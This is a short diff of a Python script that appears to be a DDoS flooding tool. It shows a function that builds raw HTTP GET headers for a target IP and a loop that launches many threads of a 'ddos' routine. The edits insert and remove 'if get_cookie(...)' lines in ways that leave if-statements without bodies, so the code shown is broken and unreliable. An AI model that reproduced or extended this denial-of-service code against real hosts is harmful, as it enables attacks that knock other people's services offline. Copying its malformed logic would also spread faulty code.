@@ -2477,6 +2477,7 @@ def get_proxies():
     
 
 def Headerss(method):
+    if get_cookie(ip):
     header = "UDP"
     if method == "UDP" or method == "TCP" or method == "HTTP":
         get_host = "GET HTTP/1.1\r\nHost: " + ip + "\r\n"
@@ -2657,6 +2658,5 @@ def ddos():
 
 
 for y in range(threads):
-    if get_cookie(target):
     th = threading.Thread(target = ddos)
     th.start()
